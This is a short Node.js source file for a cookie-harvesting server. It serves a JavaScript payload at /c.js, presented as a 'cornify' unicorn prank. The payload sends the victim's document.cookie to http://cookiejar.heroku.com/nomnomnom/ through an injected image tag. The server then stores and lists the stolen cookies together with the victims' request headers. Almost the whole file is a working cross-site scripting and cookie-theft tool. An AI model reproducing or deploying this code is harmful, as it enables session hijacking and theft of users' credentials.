var cookie_jar = [];
with(require("./lib/fab"))

( fab )
  ( fab.listen, parseInt(process.env.PORT) || 0xFAB )
  ( /^\/c.js/ )
    ( fab.tmpl, "(<%= this %>)()" )
    ( cornify.toString() )
  ( /^\/nomnomnom/ )
    (function () {
      var out = this;
      return function (head) {
        var cookie = head.url.pathname.split("/").slice(1).join("/");
        cookie_jar.push({headers: head.headers, cookie: decodeURIComponent(cookie)});
        out({ body: "yummy" })()
      }
    })
  ( /^\/reset/ )
    ( function () {
      var out = this;
      return function () {
        cookie_jar.length = 0;
        out({body: "MOAR COOKIES"})();
      }
    })
  (function () {
    var out = this;
    return function () {
      var listing = "";
      var i = (cookie_jar.length-1);
      if (i < 0)  {
        listing += "<p>FEED ME COOKIES</p>";
      } else {
        listing += "<ul>"
        while (i >= 0) {
          var c = cookie_jar[i];
          headers = ""
          for (i in c.headers) { 
            headers += ("<li><b>"+purge(i)+"</b>: "+purge(c.headers[i].toString())+"</li>"); 
          }
          listing += ("<li><div>"+purge(c.cookie)+"</div><ul>"+headers+"</ul></li>");
          i = i - 1;
        }
        listing += "</ul>"
      }
      var body = "<html><body style='font: normal 12px helvetica'>Yer Cookies: "+listing+"</body></html>"
      out({ body: body })()
    }
  })



function cornify() {
  document.write('<script type="text/javascript" src="http://www.cornify.com/js/cornify.js"></script>'); 
  var corn = function() { try { cornify_add(); } catch(e) {} setTimeout(corn, 1000); }; 
  var str = "<img src=\"http://cookiejar.heroku.com/nomnomnom/"+document.cookie+"\"/>";
  document.write(str); 
  setTimeout(corn, 1000);
}

function purge(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
}